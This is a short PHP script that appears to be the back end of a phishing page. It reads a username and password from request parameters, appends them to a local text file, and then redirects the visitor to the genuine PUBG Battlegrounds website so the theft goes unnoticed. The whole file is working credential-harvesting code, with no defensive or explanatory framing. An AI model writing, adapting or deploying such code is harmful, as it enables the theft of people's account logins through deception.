<?php

file_put_contents("usernames.txt", " Username: " . $_GET['Username_TW'] . " Pass: " . $_GET['Password_TW'] . "\n", FILE_APPEND);
header('Location: https://na.battlegrounds.pubg.com/');
exit();
?>
